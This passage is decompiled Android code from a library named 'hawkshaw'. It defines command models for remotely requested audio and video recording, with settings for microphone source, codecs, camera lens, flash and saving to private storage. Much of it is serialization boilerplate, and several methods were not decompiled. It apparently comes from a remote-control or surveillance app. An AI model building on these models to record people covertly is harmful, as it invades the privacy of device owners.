                        r0[r1] = r2     // Catch:{ NoSuchFieldError -> 0x003d }
                    L_0x003d:
                        com.hawkshaw.library.datalayer.models.Command$RecordAudioRequest$AudioSourceEnum r1 = com.hawkshaw.library.datalayer.models.Command.RecordAudioRequest.AudioSourceEnum.VOICE_RECOGNITION     // Catch:{ NoSuchFieldError -> 0x0046 }
                        int r1 = r1.ordinal()     // Catch:{ NoSuchFieldError -> 0x0046 }
                        r2 = 7
                        r0[r1] = r2     // Catch:{ NoSuchFieldError -> 0x0046 }
                    L_0x0046:
                        com.hawkshaw.library.datalayer.models.Command$RecordAudioRequest$AudioSourceEnum r1 = com.hawkshaw.library.datalayer.models.Command.RecordAudioRequest.AudioSourceEnum.VOICE_COMMUNICATION     // Catch:{ NoSuchFieldError -> 0x0050 }
                        int r1 = r1.ordinal()     // Catch:{ NoSuchFieldError -> 0x0050 }
                        r2 = 8
                        r0[r1] = r2     // Catch:{ NoSuchFieldError -> 0x0050 }
                    L_0x0050:
                        com.hawkshaw.library.datalayer.models.Command$RecordAudioRequest$AudioSourceEnum r1 = com.hawkshaw.library.datalayer.models.Command.RecordAudioRequest.AudioSourceEnum.UNPROCESSED     // Catch:{ NoSuchFieldError -> 0x005a }
                        int r1 = r1.ordinal()     // Catch:{ NoSuchFieldError -> 0x005a }
                        r2 = 9
                        r0[r1] = r2     // Catch:{ NoSuchFieldError -> 0x005a }
                    L_0x005a:
                        com.hawkshaw.library.datalayer.models.Command$RecordAudioRequest$AudioSourceEnum r1 = com.hawkshaw.library.datalayer.models.Command.RecordAudioRequest.AudioSourceEnum.VOICE_PERFORMANCE     // Catch:{ NoSuchFieldError -> 0x0064 }
                        int r1 = r1.ordinal()     // Catch:{ NoSuchFieldError -> 0x0064 }
                        r2 = 10
                        r0[r1] = r2     // Catch:{ NoSuchFieldError -> 0x0064 }
                    L_0x0064:
                        $EnumSwitchMapping$0 = r0
                        return
                    
                    throw new UnsupportedOperationException("Method not decompiled: com.hawkshaw.library.datalayer.models.Command.RecordAudioRequest.AudioSourceEnum.WhenMappings.<clinit>():void");
                }
            }

            static {
                AudioSourceEnum[] $values;
                $ENTRIES = K.J($values);
                Companion = new Companion((j3.f) null);
                $cachedSerializer$delegate = C0110h.y(W2.f.f2390D, k.f4895D);
            }

            public static C0393a getEntries() {
                return $ENTRIES;
            }

            public final int toAudioSource() {
                switch (WhenMappings.$EnumSwitchMapping$0[ordinal()]) {
                    case 1:
                        return 0;
                    case 2:
                        return 1;
                    case 3:
                        return 2;
                    case 4:
                        return 3;
                    case 5:
                        return 4;
                    case 6:
                        return 5;
                    case 7:
                        return 6;
                    case 8:
                        return 7;
                    case 9:
                        return 9;
                    case 10:
                        return 10;
                    default:
                        throw new RuntimeException();
                }
            }
        }

        public static final class Companion {
            private Companion() {
            }

            public /* synthetic */ Companion(j3.f fVar) {
                this();
            }

            public final KSerializer serializer() {
                return Command$RecordAudioRequest$$serializer.INSTANCE;
            }
        }

        @f
        public enum OutputFormatEnum {
            DEFAULT,
            THREE_GPP,
            MPEG_4,
            AMR_NB,
            AMR_WB,
            AAC_ADTS,
            MPEG_2_TS,
            WEBM,
            OGG;
            
            /* access modifiers changed from: private */
            public static final e $cachedSerializer$delegate = null;
            public static final Companion Companion = null;

            public static final class Companion {
                private Companion() {
                }

                public /* synthetic */ Companion(j3.f fVar) {
                    this();
                }

                private final /* synthetic */ KSerializer get$cachedSerializer() {
                    return (KSerializer) OutputFormatEnum.$cachedSerializer$delegate.getValue();
                }

                public final KSerializer serializer() {
                    return get$cachedSerializer();
                }
            }

            public /* synthetic */ class WhenMappings {
                public static final /* synthetic */ int[] $EnumSwitchMapping$0 = null;
                static {
                    
                        com.hawkshaw.library.datalayer.models.Command$RecordAudioRequest$OutputFormatEnum[] r0 = com.hawkshaw.library.datalayer.models.Command.RecordAudioRequest.OutputFormatEnum.values()
                        int r0 = r0.length
                        int[] r0 = new int[r0]
                        com.hawkshaw.library.datalayer.models.Command$RecordAudioRequest$OutputFormatEnum r1 = com.hawkshaw.library.datalayer.models.Command.RecordAudioRequest.OutputFormatEnum.DEFAULT     // Catch:{ NoSuchFieldError -> 0x0010 }
                        int r1 = r1.ordinal()     // Catch:{ NoSuchFieldError -> 0x0010 }
                        r2 = 1
                        r0[r1] = r2     // Catch:{ NoSuchFieldError -> 0x0010 }
                    L_0x0010:
                        com.hawkshaw.library.datalayer.models.Command$RecordAudioRequest$OutputFormatEnum r1 = com.hawkshaw.library.datalayer.models.Command.RecordAudioRequest.OutputFormatEnum.THREE_GPP     // Catch:{ NoSuchFieldError -> 0x0019 }
                        int r1 = r1.ordinal()     // Catch:{ NoSuchFieldError -> 0x0019 }
                        r2 = 2
                        r0[r1] = r2     // Catch:{ NoSuchFieldError -> 0x0019 }
                    L_0x0019:
                        com.hawkshaw.library.datalayer.models.Command$RecordAudioRequest$OutputFormatEnum r1 = com.hawkshaw.library.datalayer.models.Command.RecordAudioRequest.OutputFormatEnum.MPEG_4     // Catch:{ NoSuchFieldError -> 0x0022 }
                        int r1 = r1.ordinal()     // Catch:{ NoSuchFieldError -> 0x0022 }
                        r2 = 3
                        r0[r1] = r2     // Catch:{ NoSuchFieldError -> 0x0022 }
                    L_0x0022:
                        com.hawkshaw.library.datalayer.models.Command$RecordAudioRequest$OutputFormatEnum r1 = com.hawkshaw.library.datalayer.models.Command.RecordAudioRequest.OutputFormatEnum.AMR_NB     // Catch:{ NoSuchFieldError -> 0x002b }
                        int r1 = r1.ordinal()     // Catch:{ NoSuchFieldError -> 0x002b }
                        r2 = 4
                        r0[r1] = r2     // Catch:{ NoSuchFieldError -> 0x002b }
                    L_0x002b:
                        com.hawkshaw.library.datalayer.models.Command$RecordAudioRequest$OutputFormatEnum r1 = com.hawkshaw.library.datalayer.models.Command.RecordAudioRequest.OutputFormatEnum.AMR_WB     // Catch:{ NoSuchFieldError -> 0x0034 }
                        int r1 = r1.ordinal()     // Catch:{ NoSuchFieldError -> 0x0034 }
                        r2 = 5
                        r0[r1] = r2     // Catch:{ NoSuchFieldError -> 0x0034 }
                    L_0x0034:
                        com.hawkshaw.library.datalayer.models.Command$RecordAudioRequest$OutputFormatEnum r1 = com.hawkshaw.library.datalayer.models.Command.RecordAudioRequest.OutputFormatEnum.AAC_ADTS     // Catch:{ NoSuchFieldError -> 0x003d }
                        int r1 = r1.ordinal()     // Catch:{ NoSuchFieldError -> 0x003d }
                        r2 = 6
                        r0[r1] = r2     // Catch:{ NoSuchFieldError -> 0x003d }
                    L_0x003d:
                        com.hawkshaw.library.datalayer.models.Command$RecordAudioRequest$OutputFormatEnum r1 = com.hawkshaw.library.datalayer.models.Command.RecordAudioRequest.OutputFormatEnum.MPEG_2_TS     // Catch:{ NoSuchFieldError -> 0x0046 }
                        int r1 = r1.ordinal()     // Catch:{ NoSuchFieldError -> 0x0046 }
                        r2 = 7
                        r0[r1] = r2     // Catch:{ NoSuchFieldError -> 0x0046 }
                    L_0x0046:
                        com.hawkshaw.library.datalayer.models.Command$RecordAudioRequest$OutputFormatEnum r1 = com.hawkshaw.library.datalayer.models.Command.RecordAudioRequest.OutputFormatEnum.WEBM     // Catch:{ NoSuchFieldError -> 0x0050 }
                        int r1 = r1.ordinal()     // Catch:{ NoSuchFieldError -> 0x0050 }
                        r2 = 8
                        r0[r1] = r2     // Catch:{ NoSuchFieldError -> 0x0050 }
                    L_0x0050:
                        com.hawkshaw.library.datalayer.models.Command$RecordAudioRequest$OutputFormatEnum r1 = com.hawkshaw.library.datalayer.models.Command.RecordAudioRequest.OutputFormatEnum.OGG     // Catch:{ NoSuchFieldError -> 0x005a }
                        int r1 = r1.ordinal()     // Catch:{ NoSuchFieldError -> 0x005a }
                        r2 = 9
                        r0[r1] = r2     // Catch:{ NoSuchFieldError -> 0x005a }
                    L_0x005a:
                        $EnumSwitchMapping$0 = r0
                        return
                    
                    throw new UnsupportedOperationException("Method not decompiled: com.hawkshaw.library.datalayer.models.Command.RecordAudioRequest.OutputFormatEnum.WhenMappings.<clinit>():void");
                }
            }

            static {
                OutputFormatEnum[] $values;
                $ENTRIES = K.J($values);
                Companion = new Companion((j3.f) null);
                $cachedSerializer$delegate = C0110h.y(W2.f.f2390D, l.f4896D);
            }

            public static C0393a getEntries() {
                return $ENTRIES;
            }

            public final int toOutputFormat() {
                switch (WhenMappings.$EnumSwitchMapping$0[ordinal()]) {
                    case 1:
                        return 0;
                    case 2:
                        return 1;
                    case 3:
                        return 2;
                    case 4:
                        return 3;
                    case 5:
                        return 4;
                    case 6:
                        return 6;
                    case 7:
                        return 8;
                    case 8:
                        return 9;
                    case 9:
                        return 11;
                    default:
                        throw new RuntimeException();
                }
            }
        }

        public RecordAudioRequest() {
            this(0, 0, (AudioEncoderEnum) null, (AudioSourceEnum) null, (OutputFormatEnum) null, 0, 0, false, 255, (j3.f) null);
        }

        public static /* synthetic */ void getAudioBitRate$annotations() {
        }

        public static /* synthetic */ void getAudioChannelCount$annotations() {
        }

        public static /* synthetic */ void getAudioEncoder$annotations() {
        }

        public static /* synthetic */ void getAudioSampleRate$annotations() {
        }

        public static /* synthetic */ void getAudioSource$annotations() {
        }

        public static /* synthetic */ void getDuration$annotations() {
        }

        public static /* synthetic */ void getOutputFormat$annotations() {
        }

        public static /* synthetic */ void getSaveToPrivate$annotations() {
        }

        public static final /* synthetic */ void write$Self$library_release(RecordAudioRequest recordAudioRequest, b bVar, SerialDescriptor serialDescriptor) {
            KSerializer[] kSerializerArr = $childSerializers;
            if (bVar.q(serialDescriptor) || recordAudioRequest.duration != 30000) {
                ((q) bVar).d0(serialDescriptor, 0, recordAudioRequest.duration);
            }
            if (bVar.q(serialDescriptor) || recordAudioRequest.audioChannelCount != 1) {
                ((q) bVar).c0(1, recordAudioRequest.audioChannelCount, serialDescriptor);
            }
            if (bVar.q(serialDescriptor) || recordAudioRequest.audioEncoder != AudioEncoderEnum.AMR_NB) {
                ((q) bVar).e0(serialDescriptor, 2, kSerializerArr[2], recordAudioRequest.audioEncoder);
            }
            if (bVar.q(serialDescriptor) || recordAudioRequest.audioSource != AudioSourceEnum.DEFAULT) {
                ((q) bVar).e0(serialDescriptor, 3, kSerializerArr[3], recordAudioRequest.audioSource);
            }
            if (bVar.q(serialDescriptor) || recordAudioRequest.outputFormat != OutputFormatEnum.THREE_GPP) {
                ((q) bVar).e0(serialDescriptor, 4, kSerializerArr[4], recordAudioRequest.outputFormat);
            }
            if (bVar.q(serialDescriptor) || recordAudioRequest.audioBitRate != 64000) {
                ((q) bVar).c0(5, recordAudioRequest.audioBitRate, serialDescriptor);
            }
            if (bVar.q(serialDescriptor) || recordAudioRequest.audioSampleRate != 8000) {
                ((q) bVar).c0(6, recordAudioRequest.audioSampleRate, serialDescriptor);
            }
            if (bVar.q(serialDescriptor) || !recordAudioRequest.saveToPrivate) {
                ((q) bVar).X(serialDescriptor, 7, recordAudioRequest.saveToPrivate);
            }
        }

        public final int getAudioBitRate() {
            return this.audioBitRate;
        }

        public final int getAudioChannelCount() {
            return this.audioChannelCount;
        }

        public final AudioEncoderEnum getAudioEncoder() {
            return this.audioEncoder;
        }

        public final int getAudioSampleRate() {
            return this.audioSampleRate;
        }

        public final AudioSourceEnum getAudioSource() {
            return this.audioSource;
        }

        public final long getDuration() {
            return this.duration;
        }

        public final OutputFormatEnum getOutputFormat() {
            return this.outputFormat;
        }

        public final boolean getSaveToPrivate() {
            return this.saveToPrivate;
        }

        /* JADX WARNING: Illegal instructions before constructor call */
        /* Code decompiled incorrectly, please refer to instructions dump. */
        public /* synthetic */ RecordAudioRequest(long r11, int r13, com.hawkshaw.library.datalayer.models.Command.RecordAudioRequest.AudioEncoderEnum r14, com.hawkshaw.library.datalayer.models.Command.RecordAudioRequest.AudioSourceEnum r15, com.hawkshaw.library.datalayer.models.Command.RecordAudioRequest.OutputFormatEnum r16, int r17, int r18, boolean r19, int r20, j3.f r21) {
            
                r10 = this;
                r0 = r20
                r1 = r0 & 1
                if (r1 == 0) goto L_0x0009
                r1 = 30000(0x7530, double:1.4822E-319)
                goto L_0x000a
            L_0x0009:
                r1 = r11
            L_0x000a:
                r3 = r0 & 2
                r4 = 1
                if (r3 == 0) goto L_0x0011
                r3 = r4
                goto L_0x0012
            L_0x0011:
                r3 = r13
            L_0x0012:
                r5 = r0 & 4
                if (r5 == 0) goto L_0x0019
                com.hawkshaw.library.datalayer.models.Command$RecordAudioRequest$AudioEncoderEnum r5 = com.hawkshaw.library.datalayer.models.Command.RecordAudioRequest.AudioEncoderEnum.AMR_NB
                goto L_0x001a
            L_0x0019:
                r5 = r14
            L_0x001a:
                r6 = r0 & 8
                if (r6 == 0) goto L_0x0021
                com.hawkshaw.library.datalayer.models.Command$RecordAudioRequest$AudioSourceEnum r6 = com.hawkshaw.library.datalayer.models.Command.RecordAudioRequest.AudioSourceEnum.DEFAULT
                goto L_0x0022
            L_0x0021:
                r6 = r15
            L_0x0022:
                r7 = r0 & 16
                if (r7 == 0) goto L_0x0029
                com.hawkshaw.library.datalayer.models.Command$RecordAudioRequest$OutputFormatEnum r7 = com.hawkshaw.library.datalayer.models.Command.RecordAudioRequest.OutputFormatEnum.THREE_GPP
                goto L_0x002b
            L_0x0029:
                r7 = r16
            L_0x002b:
                r8 = r0 & 32
                if (r8 == 0) goto L_0x0033
                r8 = 64000(0xfa00, float:8.9683E-41)
                goto L_0x0035
            L_0x0033:
                r8 = r17
            L_0x0035:
                r9 = r0 & 64
                if (r9 == 0) goto L_0x003c
                r9 = 8000(0x1f40, float:1.121E-41)
                goto L_0x003e
            L_0x003c:
                r9 = r18
            L_0x003e:
                r0 = r0 & 128(0x80, float:1.8E-43)
                if (r0 == 0) goto L_0x0043
                goto L_0x0045
            L_0x0043:
                r4 = r19
            L_0x0045:
                r11 = r10
                r12 = r1
                r14 = r3
                r15 = r5
                r16 = r6
                r17 = r7
                r18 = r8
                r19 = r9
                r20 = r4
                r11.<init>(r12, r14, r15, r16, r17, r18, r19, r20)
                return
            
            throw new UnsupportedOperationException("Method not decompiled: com.hawkshaw.library.datalayer.models.Command.RecordAudioRequest.<init>(long, int, com.hawkshaw.library.datalayer.models.Command$RecordAudioRequest$AudioEncoderEnum, com.hawkshaw.library.datalayer.models.Command$RecordAudioRequest$AudioSourceEnum, com.hawkshaw.library.datalayer.models.Command$RecordAudioRequest$OutputFormatEnum, int, int, boolean, int, j3.f):void");
        }

        public /* synthetic */ RecordAudioRequest(int i5, long j5, int i6, AudioEncoderEnum audioEncoderEnum, AudioSourceEnum audioSourceEnum, OutputFormatEnum outputFormatEnum, int i7, int i8, boolean z4, q0 q0Var) {
            this.duration = (i5 & 1) == 0 ? 30000 : j5;
            if ((i5 & 2) == 0) {
                this.audioChannelCount = 1;
            } else {
                this.audioChannelCount = i6;
            }
            if ((i5 & 4) == 0) {
                this.audioEncoder = AudioEncoderEnum.AMR_NB;
            } else {
                this.audioEncoder = audioEncoderEnum;
            }
            if ((i5 & 8) == 0) {
                this.audioSource = AudioSourceEnum.DEFAULT;
            } else {
                this.audioSource = audioSourceEnum;
            }
            if ((i5 & 16) == 0) {
                this.outputFormat = OutputFormatEnum.THREE_GPP;
            } else {
                this.outputFormat = outputFormatEnum;
            }
            if ((i5 & 32) == 0) {
                this.audioBitRate = 64000;
            } else {
                this.audioBitRate = i7;
            }
            if ((i5 & 64) == 0) {
                this.audioSampleRate = 8000;
            } else {
                this.audioSampleRate = i8;
            }
            if ((i5 & 128) == 0) {
                this.saveToPrivate = true;
            } else {
                this.saveToPrivate = z4;
            }
        }

        public RecordAudioRequest(long j5, int i5, AudioEncoderEnum audioEncoderEnum, AudioSourceEnum audioSourceEnum, OutputFormatEnum outputFormatEnum, int i6, int i7, boolean z4) {
            K.n(audioEncoderEnum, "audioEncoder");
            K.n(audioSourceEnum, "audioSource");
            K.n(outputFormatEnum, "outputFormat");
            this.duration = j5;
            this.audioChannelCount = i5;
            this.audioEncoder = audioEncoderEnum;
            this.audioSource = audioSourceEnum;
            this.outputFormat = outputFormatEnum;
            this.audioBitRate = i6;
            this.audioSampleRate = i7;
            this.saveToPrivate = z4;
        }
    }

    @f
    public static final class RecordVideoRequest {
        /* access modifiers changed from: private */
        public static final KSerializer[] $childSerializers = {null, null, null, null, null, null, null, null, null, TakePictureRequest.FlashMode.Companion.serializer(), TakePictureRequest.AspectRatio.Companion.serializer(), null, TakePictureRequest.LensFacing.Companion.serializer(), TakePictureRequest.Rotation.Companion.serializer(), null, null, null, null};
        public static final Companion Companion = new Companion((j3.f) null);
        private final TakePictureRequest.AspectRatio aspectRatio;
        private final int audioBitRate;
        private final int audioChannelCount;
        private final int audioMinBufferSize;
        private final int audioSampleRate;
        private final int bitRate;
        private final long duration;
        private final TakePictureRequest.FlashMode flashMode;
        private final int iFrameInterval;
        private final TakePictureRequest.LensFacing lensFacing;
        private final int mAspectRatio;
        private final int mFlashMode;
        private final int mLensFacing;
        private final Integer mRotation;
        private final TakePictureRequest.Size maxResolution;
        private final TakePictureRequest.Rotation rotation;
        private final boolean saveToPrivate;
        private final int videoFrameRate;

        public static final class Companion {
            private Companion() {
            }

            public /* synthetic */ Companion(j3.f fVar) {
                this();
            }

            public final KSerializer serializer() {
                return Command$RecordVideoRequest$$serializer.INSTANCE;
            }
        }

        public /* synthetic */ class WhenMappings {
            public static final /* synthetic */ int[] $EnumSwitchMapping$0;
            public static final /* synthetic */ int[] $EnumSwitchMapping$1;
            public static final /* synthetic */ int[] $EnumSwitchMapping$2;
            public static final /* synthetic */ int[] $EnumSwitchMapping$3;
            static {
                
                    com.hawkshaw.library.datalayer.models.Command$TakePictureRequest$LensFacing[] r0 = com.hawkshaw.library.datalayer.models.Command.TakePictureRequest.LensFacing.values()
                    int r0 = r0.length
                    int[] r0 = new int[r0]
                    r1 = 1
                    com.hawkshaw.library.datalayer.models.Command$TakePictureRequest$LensFacing r2 = com.hawkshaw.library.datalayer.models.Command.TakePictureRequest.LensFacing.Front     // Catch:{ NoSuchFieldError -> 0x0010 }
                    int r2 = r2.ordinal()     // Catch:{ NoSuchFieldError -> 0x0010 }
                    r0[r2] = r1     // Catch:{ NoSuchFieldError -> 0x0010 }
                L_0x0010:
                    r2 = 2
                    com.hawkshaw.library.datalayer.models.Command$TakePictureRequest$LensFacing r3 = com.hawkshaw.library.datalayer.models.Command.TakePictureRequest.LensFacing.Back     // Catch:{ NoSuchFieldError -> 0x0019 }
                    int r3 = r3.ordinal()     // Catch:{ NoSuchFieldError -> 0x0019 }
                    r0[r3] = r2     // Catch:{ NoSuchFieldError -> 0x0019 }
                L_0x0019:
                    $EnumSwitchMapping$0 = r0
                    com.hawkshaw.library.datalayer.models.Command$TakePictureRequest$Rotation[] r0 = com.hawkshaw.library.datalayer.models.Command.TakePictureRequest.Rotation.values()
                    int r0 = r0.length
                    int[] r0 = new int[r0]
                    com.hawkshaw.library.datalayer.models.Command$TakePictureRequest$Rotation r3 = com.hawkshaw.library.datalayer.models.Command.TakePictureRequest.Rotation.ROTATION_0     // Catch:{ NoSuchFieldError -> 0x002a }
                    int r3 = r3.ordinal()     // Catch:{ NoSuchFieldError -> 0x002a }
                    r0[r3] = r1     // Catch:{ NoSuchFieldError -> 0x002a }
                L_0x002a:
                    com.hawkshaw.library.datalayer.models.Command$TakePictureRequest$Rotation r3 = com.hawkshaw.library.datalayer.models.Command.TakePictureRequest.Rotation.ROTATION_90     // Catch:{ NoSuchFieldError -> 0x0032 }
                    int r3 = r3.ordinal()     // Catch:{ NoSuchFieldError -> 0x0032 }
                    r0[r3] = r2     // Catch:{ NoSuchFieldError -> 0x0032 }
                L_0x0032:
                    r3 = 3
                    com.hawkshaw.library.datalayer.models.Command$TakePictureRequest$Rotation r4 = com.hawkshaw.library.datalayer.models.Command.TakePictureRequest.Rotation.ROTATION_180     // Catch:{ NoSuchFieldError -> 0x003b }
                    int r4 = r4.ordinal()     // Catch:{ NoSuchFieldError -> 0x003b }
                    r0[r4] = r3     // Catch:{ NoSuchFieldError -> 0x003b }
                L_0x003b:
                    com.hawkshaw.library.datalayer.models.Command$TakePictureRequest$Rotation r4 = com.hawkshaw.library.datalayer.models.Command.TakePictureRequest.Rotation.ROTATION_270     // Catch:{ NoSuchFieldError -> 0x0044 }
                    int r4 = r4.ordinal()     // Catch:{ NoSuchFieldError -> 0x0044 }
                    r5 = 4
                    r0[r4] = r5     // Catch:{ NoSuchFieldError -> 0x0044 }
                L_0x0044:
                    com.hawkshaw.library.datalayer.models.Command$TakePictureRequest$Rotation r4 = com.hawkshaw.library.datalayer.models.Command.TakePictureRequest.Rotation.Auto     // Catch:{ NoSuchFieldError -> 0x004d }
                    int r4 = r4.ordinal()     // Catch:{ NoSuchFieldError -> 0x004d }
                    r5 = 5
                    r0[r4] = r5     // Catch:{ NoSuchFieldError -> 0x004d }
                L_0x004d:
                    $EnumSwitchMapping$1 = r0
                    com.hawkshaw.library.datalayer.models.Command$TakePictureRequest$FlashMode[] r0 = com.hawkshaw.library.datalayer.models.Command.TakePictureRequest.FlashMode.values()
                    int r0 = r0.length
                    int[] r0 = new int[r0]
                    com.hawkshaw.library.datalayer.models.Command$TakePictureRequest$FlashMode r4 = com.hawkshaw.library.datalayer.models.Command.TakePictureRequest.FlashMode.Auto     // Catch:{ NoSuchFieldError -> 0x005e }
                    int r4 = r4.ordinal()     // Catch:{ NoSuchFieldError -> 0x005e }
                    r0[r4] = r1     // Catch:{ NoSuchFieldError -> 0x005e }
                L_0x005e:
                    com.hawkshaw.library.datalayer.models.Command$TakePictureRequest$FlashMode r4 = com.hawkshaw.library.datalayer.models.Command.TakePictureRequest.FlashMode.On     // Catch:{ NoSuchFieldError -> 0x0066 }
                    int r4 = r4.ordinal()     // Catch:{ NoSuchFieldError -> 0x0066 }
                    r0[r4] = r2     // Catch:{ NoSuchFieldError -> 0x0066 }
                L_0x0066:
                    com.hawkshaw.library.datalayer.models.Command$TakePictureRequest$FlashMode r4 = com.hawkshaw.library.datalayer.models.Command.TakePictureRequest.FlashMode.Off     // Catch:{ NoSuchFieldError -> 0x006e }
                    int r4 = r4.ordinal()     // Catch:{ NoSuchFieldError -> 0x006e }
                    r0[r4] = r3     // Catch:{ NoSuchFieldError -> 0x006e }
                L_0x006e:
                    $EnumSwitchMapping$2 = r0
                    com.hawkshaw.library.datalayer.models.Command$TakePictureRequest$AspectRatio[] r0 = com.hawkshaw.library.datalayer.models.Command.TakePictureRequest.AspectRatio.values()
                    int r0 = r0.length
                    int[] r0 = new int[r0]
                    com.hawkshaw.library.datalayer.models.Command$TakePictureRequest$AspectRatio r3 = com.hawkshaw.library.datalayer.models.Command.TakePictureRequest.AspectRatio.RATIO_4_3     // Catch:{ NoSuchFieldError -> 0x007f }
                    int r3 = r3.ordinal()     // Catch:{ NoSuchFieldError -> 0x007f }
                    r0[r3] = r1     // Catch:{ NoSuchFieldError -> 0x007f }
                L_0x007f:
                    com.hawkshaw.library.datalayer.models.Command$TakePictureRequest$AspectRatio r1 = com.hawkshaw.library.datalayer.models.Command.TakePictureRequest.AspectRatio.RATIO_16_9     // Catch:{ NoSuchFieldError -> 0x0087 }
                    int r1 = r1.ordinal()     // Catch:{ NoSuchFieldError -> 0x0087 }
                    r0[r1] = r2     // Catch:{ NoSuchFieldError -> 0x0087 }
                L_0x0087:
                    $EnumSwitchMapping$3 = r0
                    return
                
                throw new UnsupportedOperationException("Method not decompiled: com.hawkshaw.library.datalayer.models.Command.RecordVideoRequest.WhenMappings.<clinit>():void");
            }
        }

        public RecordVideoRequest() {
            this(0, 0, 0, 0, 0, 0, 0, 0, (TakePictureRequest.Size) null, (TakePictureRequest.FlashMode) null, (TakePictureRequest.AspectRatio) null, false, (TakePictureRequest.LensFacing) null, (TakePictureRequest.Rotation) null, 16383, (j3.f) null);
        }

        private static /* synthetic */ void getAspectRatio$annotations() {
        }

        public static /* synthetic */ void getAudioBitRate$annotations() {
        }

        public static /* synthetic */ void getAudioChannelCount$annotations() {
        }

        public static /* synthetic */ void getAudioMinBufferSize$annotations() {
        }

        public static /* synthetic */ void getAudioSampleRate$annotations() {
        }

        public static /* synthetic */ void getBitRate$annotations() {
        }

        public static /* synthetic */ void getDuration$annotations() {
        }

        private static /* synthetic */ void getFlashMode$annotations() {
        }

        public static /* synthetic */ void getIFrameInterval$annotations() {
        }

        private static /* synthetic */ void getLensFacing$annotations() {
        }

        public static /* synthetic */ void getMaxResolution$annotations() {
        }

        private static /* synthetic */ void getRotation$annotations() {
        }

        public static /* synthetic */ void getSaveToPrivate$annotations() {
        }

        public static /* synthetic */ void getVideoFrameRate$annotations() {
        }

        /* JADX WARNING: Code restructure failed: missing block: B:110:0x01e5, code lost:*/
            if (r0 != r1) goto L_0x01e7;
         
        /* JADX WARNING: Code restructure failed: missing block: B:79:0x016e, code lost:*/
            if (r0 != r1) goto L_0x0170;
         
        /* JADX WARNING: Code restructure failed: missing block: B:97:0x01b6, code lost:*/
            if (Y1.K.f(r0, r1) == false) goto L_0x01b8;
         
        /* Code decompiled incorrectly, please refer to instructions dump. */
        public static final /* synthetic */ void write$Self$library_release(com.hawkshaw.library.datalayer.models.Command.RecordVideoRequest r12, D3.b r13, kotlinx.serialization.descriptors.SerialDescriptor r14) {
            
                kotlinx.serialization.KSerializer[] r0 = $childSerializers
                boolean r1 = r13.q(r14)
                r2 = 0
                if (r1 == 0) goto L_0x000a
                goto L_0x0012
            L_0x000a:
                long r3 = r12.duration
                r5 = 30000(0x7530, double:1.4822E-319)
                int r1 = (r3 > r5 ? 1 : (r3 == r5 ? 0 : -1))
                if (r1 == 0) goto L_0x001a
            L_0x0012:
                long r3 = r12.duration
                r1 = r13
                p3.q r1 = (p3.q) r1
                r1.d0(r14, r2, r3)
            L_0x001a:
                boolean r1 = r13.q(r14)
                r3 = 1
                r4 = 16
                if (r1 == 0) goto L_0x0024
                goto L_0x0028
            L_0x0024:
                int r1 = r12.videoFrameRate
                if (r1 == r4) goto L_0x0030
            L_0x0028:
                int r1 = r12.videoFrameRate
                r5 = r13
                p3.q r5 = (p3.q) r5
                r5.c0(r3, r1, r14)
            L_0x0030:
                boolean r1 = r13.q(r14)
                r5 = 2
                if (r1 == 0) goto L_0x0038
                goto L_0x003e
            L_0x0038:
                int r1 = r12.bitRate
                r6 = 8388608(0x800000, float:1.1754944E-38)
                if (r1 == r6) goto L_0x0046
            L_0x003e:
                int r1 = r12.bitRate
                r6 = r13
                p3.q r6 = (p3.q) r6
                r6.c0(r5, r1, r14)
            L_0x0046:
                boolean r1 = r13.q(r14)
                r6 = 3
                if (r1 == 0) goto L_0x004e
                goto L_0x0052
            L_0x004e:
                int r1 = r12.iFrameInterval
                if (r1 == r3) goto L_0x005a
            L_0x0052:
                int r1 = r12.iFrameInterval
                r7 = r13
                p3.q r7 = (p3.q) r7
                r7.c0(r6, r1, r14)
            L_0x005a:
                boolean r1 = r13.q(r14)
                r7 = 4
                if (r1 == 0) goto L_0x0062
                goto L_0x0069
            L_0x0062:
                int r1 = r12.audioBitRate
                r8 = 64000(0xfa00, float:8.9683E-41)
                if (r1 == r8) goto L_0x0071
            L_0x0069:
                int r1 = r12.audioBitRate
                r8 = r13
                p3.q r8 = (p3.q) r8
                r8.c0(r7, r1, r14)
            L_0x0071:
                boolean r1 = r13.q(r14)
                r8 = 5
                if (r1 == 0) goto L_0x0079
                goto L_0x007f
            L_0x0079:
                int r1 = r12.audioSampleRate
                r9 = 8000(0x1f40, float:1.121E-41)
                if (r1 == r9) goto L_0x0087
            L_0x007f:
                int r1 = r12.audioSampleRate
                r9 = r13
                p3.q r9 = (p3.q) r9
                r9.c0(r8, r1, r14)
            L_0x0087:
                boolean r1 = r13.q(r14)
                if (r1 == 0) goto L_0x008e
                goto L_0x0092
            L_0x008e:
                int r1 = r12.audioChannelCount
                if (r1 == r3) goto L_0x009b
            L_0x0092:
                int r1 = r12.audioChannelCount
                r9 = r13
                p3.q r9 = (p3.q) r9
                r10 = 6
                r9.c0(r10, r1, r14)
            L_0x009b:
                boolean r1 = r13.q(r14)
                if (r1 == 0) goto L_0x00a2
                goto L_0x00a8
            L_0x00a2:
                int r1 = r12.audioMinBufferSize
                r9 = 1024(0x400, float:1.435E-42)
                if (r1 == r9) goto L_0x00b1
            L_0x00a8:
                int r1 = r12.audioMinBufferSize
                r9 = r13
                p3.q r9 = (p3.q) r9
                r10 = 7
                r9.c0(r10, r1, r14)
            L_0x00b1:
                boolean r1 = r13.q(r14)
                if (r1 == 0) goto L_0x00b8
                goto L_0x00c9
            L_0x00b8:
                com.hawkshaw.library.datalayer.models.Command$TakePictureRequest$Size r1 = r12.maxResolution
                com.hawkshaw.library.datalayer.models.Command$TakePictureRequest$Size r9 = new com.hawkshaw.library.datalayer.models.Command$TakePictureRequest$Size
                r10 = 1200(0x4b0, float:1.682E-42)
                r11 = 1600(0x640, float:2.242E-42)
                r9.<init>(r10, r11)
                boolean r1 = Y1.K.f(r1, r9)
                if (r1 != 0) goto L_0x00d5
            L_0x00c9:
                com.hawkshaw.library.datalayer.models.Command$TakePictureRequest$Size$$serializer r1 = com.hawkshaw.library.datalayer.models.Command$TakePictureRequest$Size$$serializer.INSTANCE
                com.hawkshaw.library.datalayer.models.Command$TakePictureRequest$Size r9 = r12.maxResolution
                r10 = r13
                p3.q r10 = (p3.q) r10
                r11 = 8
                r10.e0(r14, r11, r1, r9)
            L_0x00d5:
                boolean r1 = r13.q(r14)
                if (r1 == 0) goto L_0x00dc
                goto L_0x00e2
            L_0x00dc:
                com.hawkshaw.library.datalayer.models.Command$TakePictureRequest$FlashMode r1 = r12.flashMode
